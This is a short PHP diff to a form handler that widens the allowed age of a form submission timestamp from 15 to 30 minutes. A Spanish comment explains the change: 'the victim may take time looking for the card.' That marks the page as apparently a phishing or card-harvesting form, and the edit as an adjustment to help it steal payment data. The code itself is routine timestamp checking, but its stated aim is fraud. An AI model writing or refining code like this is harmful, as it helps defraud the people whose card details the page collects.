@@ -29,7 +29,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $cts = (int)$form_ts;
         $nowms = (int)round(microtime(true) * 1000);
         $age = $nowms - $cts;
-        if ($age >= 800 && $age <= (15 * 60 * 1000)) $ts_ok = true;
+        // Ventana ampliada a 30 min: la víctima puede tardar buscando la tarjeta
+        if ($age >= 800 && $age <= (30 * 60 * 1000)) $ts_ok = true;
     }
     if (!$ts_ok) {
         header('HTTP/1.1 403 Forbidden');
